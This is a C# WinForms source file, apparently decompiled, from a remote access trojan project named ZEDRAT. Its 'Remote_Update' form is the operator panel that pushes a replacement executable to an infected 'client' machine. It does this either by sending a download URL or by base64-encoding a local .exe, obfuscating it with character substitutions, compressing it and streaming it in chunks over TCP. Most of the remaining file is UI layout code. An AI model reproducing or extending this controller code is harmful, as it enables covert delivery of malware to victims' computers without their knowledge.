using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Bunifu.UI.WinForms;
using Bunifu.UI.WinForms.BunifuButton;
using Guna.UI2.WinForms;

using Sockets;
using ZEDRAT.Algorithm;
using ZEDRAT.TCP;
using TextBox = Guna.UI2.WinForms.Guna2TextBox;

namespace ZEDRatApp.Forms
{
	public class Remote_Update : Form
	{
		private readonly string strHostIPAddress;

		private bool bUseDownload;

		private TcpClientSession _tcs;

		private IContainer components;

		private Label lblURL;

		private Label lblInformation;

		private Label label1;

		private Guna2Elipse Guna2Elipse1;

		private Guna2Button btnBrowse;

		private Guna2Button btnUpdate;

		private Guna2TextBox txtURL;

		private Guna2TextBox txtPath;

		private Guna2Panel Guna2Panel1;

		private Guna2ToggleSwitch radioURL;

		private Guna2ToggleSwitch radioLocalFile;

		private Guna2HtmlLabel Guna2HtmlLabel12;

		private Guna2ControlBox Guna2ControlBox1;

		private BunifuSeparator bunifuSeparator1;

		private BunifuIconButton CloseBtn;

		private Guna2ShadowForm guna2ShadowForm1;

		public Remote_Update(string strHostIPAddress, TcpClientSession tcs)
		{
			this.InitializeComponent();
			this.strHostIPAddress = strHostIPAddress;
			this._tcs = tcs;
		}

		private void Remote_Update_Load(object sender, EventArgs e)
		{
			this.Text = "Update client :" + this.strHostIPAddress;
			if (this.bUseDownload)
			{
				this.radioURL.Checked = true;
			}
			((Control)(object)this.btnUpdate).Text = "Update client";
		}

		private void btnUpdate_Click(object sender, EventArgs e)
		{
			this.bUseDownload = this.radioURL.Checked;
			if (this.bUseDownload)
			{
				string text = (this.txtURL).Text;
				if (string.IsNullOrEmpty(text))
				{
					throw new Exception();
				}
				this._tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("RemoteUrl" + text));
			}
			else
			{
				string path = (File.Exists((this.txtPath).Text) ? (this.txtPath).Text : string.Empty);
				if (!File.Exists(path))
				{
					return;
				}
				string s = Convert.ToBase64String(File.ReadAllBytes(path)).Replace("O", "*").Replace("o", "-")
					.Replace("A", ":");
				byte[] array = GZip.Compress(Encoding.UTF8.GetBytes(s));
				int num = 15000;
				int num2 = array.Length / num;
				num2 = ((array.Length % num > 0) ? (num2 + 1) : num2);
				for (int i = 0; i < num2; i++)
				{
					string s2 = string.Concat("ClientUpdate:" + ((i + 1 < 10) ? ("0" + (i + 1) + "/") : (i + 1 + "/")), (num2 < 10) ? ("0" + num2 + ":") : (num2 + ":"));
					int num3 = Encoding.UTF8.GetBytes(s2).Length;
					int num4 = 0;
					num4 = ((array.Length - i * num < num) ? (array.Length - i * num) : num);
					byte[] array2 = new byte[num3 + num4];
					Buffer.BlockCopy(Encoding.UTF8.GetBytes(s2), 0, array2, 0, num3);
					Buffer.BlockCopy(array, i * num, array2, num3, num4);
					this._tcs.Client_Send(DataType.RemoteOtherType, array2);
					Thread.Sleep(10);
				}
			}
			base.DialogResult = DialogResult.OK;
			base.Close();
		}

		private void btnBrowse_Click(object sender, EventArgs e)
		{
			using OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.ValidateNames = true;
			openFileDialog.CheckPathExists = true;
			openFileDialog.CheckFileExists = true;
			openFileDialog.Multiselect = false;
			openFileDialog.Filter = "Executable (*.exe)|*.exe";
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				(this.txtPath).Text = Path.Combine(openFileDialog.InitialDirectory, openFileDialog.FileName);
			}
		}

		private void siticoneGradientCircleButton1_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		[DllImport("user32.DLL")]
		private static extern void ReleaseCapture();

		[DllImport("user32.DLL")]
		private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

		private void BarraTitulo_MouseDown(object sender, MouseEventArgs e)
		{
			Remote_Update.ReleaseCapture();
			Remote_Update.SendMessage(base.Handle, 274, 61458, 0);
		}

		private void Guna2Panel1_MouseDown(object sender, MouseEventArgs e)
		{
			Remote_Update.ReleaseCapture();
			Remote_Update.SendMessage(base.Handle, 274, 61458, 0);
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
																																																															this.components = new System.ComponentModel.Container();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(ZEDRatApp.Forms.Remote_Update));
			this.lblURL = new System.Windows.Forms.Label();
			this.lblInformation = new System.Windows.Forms.Label();
			this.label1 = new System.Windows.Forms.Label();
			this.Guna2Elipse1 = new Guna2Elipse(this.components);
			this.btnUpdate = new Guna2Button();
			this.btnBrowse = new Guna2Button();
			this.txtPath = new Guna2TextBox();
			this.txtURL = new Guna2TextBox();
			this.radioLocalFile = new Guna2ToggleSwitch();
			this.radioURL = new Guna2ToggleSwitch();
			this.Guna2Panel1 = new Guna2Panel();
			this.CloseBtn = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuSeparator1 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.Guna2ControlBox1 = new Guna2ControlBox();
			this.Guna2HtmlLabel12 = new Guna2HtmlLabel();
			this.guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(this.components);
			((System.Windows.Forms.Control)(object)this.Guna2Panel1).SuspendLayout();
			base.SuspendLayout();
			this.lblURL.AutoSize = true;
			this.lblURL.ForeColor = System.Drawing.Color.White;
			this.lblURL.Location = new System.Drawing.Point(79, 208);
			this.lblURL.Name = "lblURL";
			this.lblURL.Size = new System.Drawing.Size(31, 16);
			this.lblURL.TabIndex = 0;
			this.lblURL.Text = "URL:";
			this.lblInformation.AutoSize = true;
			this.lblInformation.ForeColor = System.Drawing.Color.White;
			this.lblInformation.Location = new System.Drawing.Point(127, 261);
			this.lblInformation.Name = "lblInformation";
			this.lblInformation.Size = new System.Drawing.Size(417, 16);
			this.lblInformation.TabIndex = 4;
			this.lblInformation.Text = "Make sure to use the same settings in the new client. Make sure the file exists.";
			this.label1.AutoSize = true;
			this.label1.ForeColor = System.Drawing.Color.White;
			this.label1.Location = new System.Drawing.Point(78, 134);
			this.label1.Name = "label1";
			this.label1.Size = new System.Drawing.Size(37, 16);
			this.label1.TabIndex = 0;
			this.label1.Text = "Path:";
			this.Guna2Elipse1.BorderRadius = 0;
			this.Guna2Elipse1.TargetControl = this;
			(this.btnUpdate).BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			(this.btnUpdate).BorderThickness = 1;
			(this.btnUpdate).CheckedState.Parent = this.btnUpdate;
			(this.btnUpdate).CustomBorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			(this.btnUpdate).CustomImages.Parent = this.btnUpdate;
			(this.btnUpdate).FillColor = System.Drawing.Color.FromArgb(9, 8, 13);
			((System.Windows.Forms.Control)(object)this.btnUpdate).Font = new System.Drawing.Font("Century Gothic", 9f);
			((System.Windows.Forms.Control)(object)this.btnUpdate).ForeColor = System.Drawing.Color.White;
			((System.Windows.Forms.Control)(object)this.btnUpdate).Location = new System.Drawing.Point(586, 245);
			((System.Windows.Forms.Control)(object)this.btnUpdate).Name = "btnUpdate";
			(this.btnUpdate).ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.btnUpdate;
			((System.Windows.Forms.Control)(object)this.btnUpdate).Size = new System.Drawing.Size(97, 28);
			((System.Windows.Forms.Control)(object)this.btnUpdate).TabIndex = 6;
			((System.Windows.Forms.Control)(object)this.btnUpdate).Text = "Run Update";
			((System.Windows.Forms.Control)(object)this.btnUpdate).Click += new System.EventHandler(btnUpdate_Click);
			(this.btnBrowse).BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			(this.btnBrowse).BorderThickness = 1;
			(this.btnBrowse).CheckedState.Parent = this.btnBrowse;
			(this.btnBrowse).CustomBorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			(this.btnBrowse).CustomImages.Parent = this.btnBrowse;
			(this.btnBrowse).FillColor = System.Drawing.Color.FromArgb(9, 8, 13);
			((System.Windows.Forms.Control)(object)this.btnBrowse).Font = new System.Drawing.Font("Century Gothic", 9f);
			((System.Windows.Forms.Control)(object)this.btnBrowse).ForeColor = System.Drawing.Color.White;
			((System.Windows.Forms.Control)(object)this.btnBrowse).Location = new System.Drawing.Point(557, 118);
			((System.Windows.Forms.Control)(object)this.btnBrowse).Name = "btnBrowse";
			(this.btnBrowse).ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.btnBrowse;
			((System.Windows.Forms.Control)(object)this.btnBrowse).Size = new System.Drawing.Size(97, 28);
			((System.Windows.Forms.Control)(object)this.btnBrowse).TabIndex = 7;
			((System.Windows.Forms.Control)(object)this.btnBrowse).Text = "Browse";
			((System.Windows.Forms.Control)(object)this.btnBrowse).Click += new System.EventHandler(btnBrowse_Click);
			(this.txtPath).BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.txtPath).Cursor = System.Windows.Forms.Cursors.IBeam;
			(this.txtPath).DefaultText = "";
			(this.txtPath).DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			(this.txtPath).DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			(this.txtPath).DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			(this.txtPath).DisabledState.Parent = this.txtPath;
			(this.txtPath).DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			(this.txtPath).FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			(this.txtPath).FocusedState.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			(this.txtPath).FocusedState.Parent = this.txtPath;
			((System.Windows.Forms.Control)(object)this.txtPath).Location = new System.Drawing.Point(129, 120);
			((System.Windows.Forms.Control)(object)this.txtPath).Name = "txtPath";
			(this.txtPath).PasswordChar = '\0';
			(this.txtPath).PlaceholderText = "";
			(this.txtPath).SelectedText = "";
			(this.txtPath).ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.txtPath;
			((System.Windows.Forms.Control)(object)this.txtPath).Size = new System.Drawing.Size(422, 26);
			((System.Windows.Forms.Control)(object)this.txtPath).TabIndex = 24;
			(this.txtURL).BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.txtURL).Cursor = System.Windows.Forms.Cursors.IBeam;
			(this.txtURL).DefaultText = "";
			(this.txtURL).DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			(this.txtURL).DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			(this.txtURL).DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			(this.txtURL).DisabledState.Parent = this.txtURL;
			(this.txtURL).DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			(this.txtURL).FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			(this.txtURL).FocusedState.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			(this.txtURL).FocusedState.Parent = this.txtURL;
			((System.Windows.Forms.Control)(object)this.txtURL).Location = new System.Drawing.Point(129, 194);
			((System.Windows.Forms.Control)(object)this.txtURL).Name = "txtURL";
			(this.txtURL).PasswordChar = '\0';
			(this.txtURL).PlaceholderText = "";
			(this.txtURL).SelectedText = "";
			(this.txtURL).ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.txtURL;
			((System.Windows.Forms.Control)(object)this.txtURL).Size = new System.Drawing.Size(422, 26);
			((System.Windows.Forms.Control)(object)this.txtURL).TabIndex = 25;
			((System.Windows.Forms.Control)(object)this.radioLocalFile).ForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.radioLocalFile).Location = new System.Drawing.Point(138, 154);
			((System.Windows.Forms.Control)(object)this.radioLocalFile).Name = "radioLocalFile";
			((System.Windows.Forms.Control)(object)this.radioLocalFile).Size = new System.Drawing.Size(38, 14);
			((System.Windows.Forms.Control)(object)this.radioLocalFile).TabIndex = 26;
			((System.Windows.Forms.Control)(object)this.radioLocalFile).Text = "Guna2ToggleSwitch1";
			((System.Windows.Forms.Control)(object)this.radioURL).ForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.radioURL).Location = new System.Drawing.Point(138, 226);
			((System.Windows.Forms.Control)(object)this.radioURL).Name = "radioURL";
			((System.Windows.Forms.Control)(object)this.radioURL).Size = new System.Drawing.Size(38, 14);
			((System.Windows.Forms.Control)(object)this.radioURL).TabIndex = 27;
			((System.Windows.Forms.Control)(object)this.radioURL).Text = "Guna2ToggleSwitch1";
			((System.Windows.Forms.Control)(object)this.Guna2Panel1).Controls.Add(this.CloseBtn);
			((System.Windows.Forms.Control)(object)this.Guna2Panel1).Controls.Add(this.bunifuSeparator1);
			((System.Windows.Forms.Control)(object)this.Guna2Panel1).Controls.Add((System.Windows.Forms.Control)(object)this.Guna2ControlBox1);
			((System.Windows.Forms.Control)(object)this.Guna2Panel1).Controls.Add((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12);
			((System.Windows.Forms.Control)(object)this.Guna2Panel1).Dock = System.Windows.Forms.DockStyle.Top;
			((System.Windows.Forms.Control)(object)this.Guna2Panel1).Location = new System.Drawing.Point(0, 0);
			((System.Windows.Forms.Control)(object)this.Guna2Panel1).Name = "Guna2Panel1";
			this.Guna2Panel1.ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.Guna2Panel1;
			((System.Windows.Forms.Control)(object)this.Guna2Panel1).Size = new System.Drawing.Size(837, 100);
			((System.Windows.Forms.Control)(object)this.Guna2Panel1).TabIndex = 28;
			((System.Windows.Forms.Control)(object)this.Guna2Panel1).MouseDown += new System.Windows.Forms.MouseEventHandler(Guna2Panel1_MouseDown);
			this.CloseBtn.AllowAnimations = true;
			this.CloseBtn.AllowBorderColorChanges = true;
			this.CloseBtn.AllowMouseEffects = true;
			this.CloseBtn.Anchor = System.Windows.Forms.AnchorStyles.None;
			this.CloseBtn.AnimationSpeed = 200;
			this.CloseBtn.BackColor = System.Drawing.Color.Transparent;
			this.CloseBtn.BackgroundColor = System.Drawing.Color.Transparent;
			this.CloseBtn.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.CloseBtn.BorderRadius = 1;
			this.CloseBtn.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.CloseBtn.BorderThickness = 1;
			this.CloseBtn.ColorContrastOnClick = 30;
			this.CloseBtn.ColorContrastOnHover = 30;
			this.CloseBtn.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges.BottomLeft = true;
			borderEdges.BottomRight = true;
			borderEdges.TopLeft = true;
			borderEdges.TopRight = true;
			this.CloseBtn.CustomizableEdges = borderEdges;
			this.CloseBtn.DialogResult = System.Windows.Forms.DialogResult.None;
			this.CloseBtn.Image = (System.Drawing.Image)resources.GetObject("CloseBtn.Image");
			this.CloseBtn.ImageMargin = new System.Windows.Forms.Padding(0);
			this.CloseBtn.Location = new System.Drawing.Point(12, 12);
			this.CloseBtn.Name = "CloseBtn";
			this.CloseBtn.RoundBorders = false;
			this.CloseBtn.ShowBorders = true;
			this.CloseBtn.Size = new System.Drawing.Size(35, 35);
			this.CloseBtn.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.CloseBtn.TabIndex = 170;
			this.bunifuSeparator1.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator1.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator1.BackgroundImage");
			this.bunifuSeparator1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator1.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator1.LineColor = System.Drawing.Color.DimGray;
			this.bunifuSeparator1.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.DoubleEdgeFaded;
			this.bunifuSeparator1.LineThickness = 1;
			this.bunifuSeparator1.Location = new System.Drawing.Point(0, 64);
			this.bunifuSeparator1.Margin = new System.Windows.Forms.Padding(6, 2, 6, 2);
			this.bunifuSeparator1.Name = "bunifuSeparator1";
			this.bunifuSeparator1.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator1.Size = new System.Drawing.Size(837, 9);
			this.bunifuSeparator1.TabIndex = 51;
			((System.Windows.Forms.Control)(object)this.Guna2ControlBox1).Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			((System.Windows.Forms.Control)(object)this.Guna2ControlBox1).BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.Guna2ControlBox1.BorderColor = System.Drawing.Color.DarkGray;
			this.Guna2ControlBox1.BorderRadius = 12;
			this.Guna2ControlBox1.FillColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.Guna2ControlBox1.IconColor = System.Drawing.Color.Black;
			((System.Windows.Forms.Control)(object)this.Guna2ControlBox1).Location = new System.Drawing.Point(780, 12);
			((System.Windows.Forms.Control)(object)this.Guna2ControlBox1).Name = "Guna2ControlBox1";
			this.Guna2ControlBox1.PressedColor = System.Drawing.Color.Red;
			this.Guna2ControlBox1.ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.Guna2ControlBox1;
			((System.Windows.Forms.Control)(object)this.Guna2ControlBox1).Size = new System.Drawing.Size(45, 29);
			((System.Windows.Forms.Control)(object)this.Guna2ControlBox1).TabIndex = 38;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).BackColor = System.Drawing.Color.Transparent;
			this.Guna2HtmlLabel12.Font = new System.Drawing.Font("Century Gothic", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.Guna2HtmlLabel12.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).Location = new System.Drawing.Point(353, 21);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).Name = "Guna2HtmlLabel12";
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).Size = new System.Drawing.Size(130, 23);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).TabIndex = 37;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).Text = "Remote Update";
			this.guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.guna2ShadowForm1.TargetForm = this;
			base.AutoScaleDimensions = new System.Drawing.SizeF(96f, 96f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi;
			this.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			base.ClientSize = new System.Drawing.Size(837, 318);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.Guna2Panel1);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.radioURL);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.radioLocalFile);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.txtURL);
			base.Controls.Add(this.label1);
			base.Controls.Add(this.lblURL);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.txtPath);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.btnBrowse);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.btnUpdate);
			base.Controls.Add(this.lblInformation);
			this.Font = new System.Drawing.Font("Century Gothic", 8.25f);
			this.ForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.MaximizeBox = false;
			base.MinimizeBox = false;
			base.Name = "Remote_Update";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "Update []";
			base.Load += new System.EventHandler(Remote_Update_Load);
			base.MouseDown += new System.Windows.Forms.MouseEventHandler(BarraTitulo_MouseDown);
			((System.Windows.Forms.Control)(object)this.Guna2Panel1).ResumeLayout(false);
			((System.Windows.Forms.Control)(object)this.Guna2Panel1).PerformLayout();
			base.ResumeLayout(false);
			base.PerformLayout();
		}
	}
}
